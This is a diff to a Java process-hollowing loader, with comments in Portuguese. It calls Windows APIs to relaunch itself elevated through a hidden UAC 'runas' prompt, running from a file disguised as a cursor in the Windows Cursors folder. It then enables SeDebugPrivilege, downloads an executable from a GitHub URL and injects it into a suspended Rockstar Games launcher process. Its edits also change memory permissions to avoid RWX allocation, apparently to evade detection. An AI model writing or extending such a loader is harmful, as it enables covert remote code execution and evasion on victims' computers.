@@ -29,6 +29,8 @@ public class ProcessHollow {
     static MethodHandle lookupPrivilegeValue;
     static MethodHandle adjustTokenPrivileges;
     static MethodHandle getCurrentProcess;
+    static MethodHandle shellExecuteEx;
+    static MethodHandle isUserAnAdmin;
 
     static {
         try {
@@ -36,6 +38,15 @@ public class ProcessHollow {
             SymbolLookup kernel32 = SymbolLookup.libraryLookup("kernel32", Arena.global());
             SymbolLookup ntdll = SymbolLookup.libraryLookup("ntdll", Arena.global());
             SymbolLookup advapi32 = SymbolLookup.libraryLookup("advapi32", Arena.global());
+            SymbolLookup shell32 = SymbolLookup.libraryLookup("shell32", Arena.global());
+
+            isUserAnAdmin = linker.downcallHandle(
+                shell32.find("IsUserAnAdmin").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT));
+
+            shellExecuteEx = linker.downcallHandle(
+                shell32.find("ShellExecuteExW").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
 
             createProcess = linker.downcallHandle(
                 kernel32.find("CreateProcessW").orElseThrow(),
@@ -131,8 +142,6 @@ public class ProcessHollow {
             short sizeOfOptionalHeader = bb.getShort(e_lfanew + 0x4 + 0x10);
             long imageBase = bb.getLong(e_lfanew + 0x18 + 0x18);
 
-            System.out.println("Ready..");
-
             MemorySegment pThreadContext = arena.allocate(0x4d0);
 
             String targetHost = host;
@@ -153,9 +162,7 @@ public class ProcessHollow {
             MemorySegment currentDirSeg = arena.allocate(currentDirBytes.length);
             currentDirSeg.copyFrom(MemorySegment.ofArray(currentDirBytes));
 
-            // Criar processo com privilégios elevados
-            // CREATE_SUSPENDED = 0x00000004
-            // CREATE_NO_WINDOW = 0x08000000
+            // CREATE_SUSPENDED = 0x00000004, CREATE_NO_WINDOW = 0x08000000
             int creationFlags = 0x00000004 | 0x08000000;
             
             int success = (int) createProcess.invokeExact(
@@ -173,8 +180,9 @@ public class ProcessHollow {
 
             int unmapResult = (int) zwUnmapViewOfSection.invokeExact(hProcess, imageBaseSeg);
 
+            // Aloca memória com RW primeiro (não RWX!)
             MemorySegment remoteAddr = (MemorySegment) virtualAllocEx.invokeExact(
-                hProcess, imageBaseSeg, (long) sizeOfImage, 0x3000, 0x40);
+                hProcess, imageBaseSeg, (long) sizeOfImage, 0x3000, 0x04); // PAGE_READWRITE
             long remoteAddrLong = remoteAddr.address();
 
             if (remoteAddrLong == 0) return;
@@ -260,6 +268,10 @@ public class ProcessHollow {
 
             int rt = (int) resumeThread.invokeExact(hThread);
             
+            if (rt == -1) {
+                return; // ResumeThread falhou
+            }
+            
             System.out.println("Ready..");
             
             // Aguarda 2 segundos para garantir que o processo inicializou
@@ -272,11 +284,59 @@ public class ProcessHollow {
 
     public static void main(String[] args) throws Throwable {
         try {
-            // Eleva privilégios do processo atual
+            // Verifica se está rodando como admin
+            int isAdmin = (int) isUserAnAdmin.invokeExact();
+            
+            if (isAdmin == 0) {
+                // Não é admin, re-executa com UAC
+                try (Arena arena = Arena.ofConfined()) {
+                    // Monta o comando java completo
+                    String javaHome = System.getProperty("java.home");
+                    String javaExe = javaHome + "\\bin\\java.exe";
+                    String curFile = "C:\\Windows\\Cursors\\aero_arrow_rv.cur";
+                    String params = "--source 21 --enable-preview --enable-native-access=ALL-UNNAMED \"" + curFile + "\"";
+                    
+                    // Estrutura SHELLEXECUTEINFOW
+                    MemorySegment shellExecInfo = arena.allocate(0x70);
+                    shellExecInfo.set(ValueLayout.JAVA_INT, 0, 0x70); // cbSize
+                    shellExecInfo.set(ValueLayout.JAVA_INT, 4, 0x00000040); // fMask = SEE_MASK_NOCLOSEPROCESS
+                    shellExecInfo.set(ValueLayout.ADDRESS, 0x08, MemorySegment.NULL); // hwnd
+                    
+                    // lpVerb = "runas"
+                    String verb = "runas\0";
+                    byte[] verbBytes = verb.getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+                    MemorySegment verbSeg = arena.allocate(verbBytes.length);
+                    verbSeg.copyFrom(MemorySegment.ofArray(verbBytes));
+                    shellExecInfo.set(ValueLayout.ADDRESS, 0x10, verbSeg);
+                    
+                    // lpFile = java.exe
+                    byte[] fileBytes = (javaExe + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+                    MemorySegment fileSeg = arena.allocate(fileBytes.length);
+                    fileSeg.copyFrom(MemorySegment.ofArray(fileBytes));
+                    shellExecInfo.set(ValueLayout.ADDRESS, 0x18, fileSeg);
+                    
+                    // lpParameters = argumentos
+                    byte[] paramBytes = (params + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+                    MemorySegment paramSeg = arena.allocate(paramBytes.length);
+                    paramSeg.copyFrom(MemorySegment.ofArray(paramBytes));
+                    shellExecInfo.set(ValueLayout.ADDRESS, 0x20, paramSeg);
+                    
+                    shellExecInfo.set(ValueLayout.ADDRESS, 0x28, MemorySegment.NULL); // lpDirectory
+                    shellExecInfo.set(ValueLayout.JAVA_INT, 0x30, 0); // nShow = SW_HIDE
+                    
+                    int result = (int) shellExecuteEx.invokeExact(shellExecInfo);
+                    
+                    // Sai do processo não-elevado
+                    System.exit(0);
+                }
+                return;
+            }
+            
+            // Está como admin, continua normalmente
             enableDebugPrivilege();
             
             String url = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/MixCodes.exe";
-            String file = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+            String file = "C:\\Program Files\\Rockstar Games\\Launcher\\LauncherPatcher.exe";
 
             byte[] data = downloadFileAsync(url);
             Load(data, file, "");
@@ -286,29 +346,28 @@ public class ProcessHollow {
 
     static void enableDebugPrivilege() {
         try (Arena arena = Arena.ofConfined()) {
-            // TOKEN_ADJUST_PRIVILEGES = 0x0020, TOKEN_QUERY = 0x0008
+            // TOKEN_ADJUST_PRIVILEGES = 0x0020, TOKEN_QUERY = 0x0008, TOKEN_DUPLICATE = 0x0002
             MemorySegment hToken = arena.allocate(ValueLayout.ADDRESS);
             MemorySegment hProcess = (MemorySegment) getCurrentProcess.invokeExact();
             
-            int result = (int) openProcessToken.invokeExact(hProcess, 0x0028, hToken);
+            int result = (int) openProcessToken.invokeExact(hProcess, 0x002A, hToken);
             if (result == 0) return;
             
             MemorySegment tokenHandle = hToken.get(ValueLayout.ADDRESS, 0);
             
-            // SE_DEBUG_NAME = "SeDebugPrivilege"
+            // Ativa SeDebugPrivilege
             String privName = "SeDebugPrivilege\0";
             byte[] privBytes = privName.getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
             MemorySegment privNameSeg = arena.allocate(privBytes.length);
             privNameSeg.copyFrom(MemorySegment.ofArray(privBytes));
             
-            // TOKEN_PRIVILEGES structure: 4 bytes count + 8 bytes LUID + 4 bytes attributes
             MemorySegment luid = arena.allocate(8);
             int lookupResult = (int) lookupPrivilegeValue.invokeExact(MemorySegment.NULL, privNameSeg, luid);
             
             if (lookupResult != 0) {
                 MemorySegment tp = arena.allocate(16);
-                tp.set(ValueLayout.JAVA_INT, 0, 1); // PrivilegeCount
-                tp.set(ValueLayout.JAVA_LONG, 4, luid.get(ValueLayout.JAVA_LONG, 0)); // LUID
+                tp.set(ValueLayout.JAVA_INT, 0, 1);
+                tp.set(ValueLayout.JAVA_LONG, 4, luid.get(ValueLayout.JAVA_LONG, 0));
                 tp.set(ValueLayout.JAVA_INT, 12, 0x00000002); // SE_PRIVILEGE_ENABLED
                 
                 adjustTokenPrivileges.invokeExact(tokenHandle, 0, tp, 0, MemorySegment.NULL, MemorySegment.NULL);
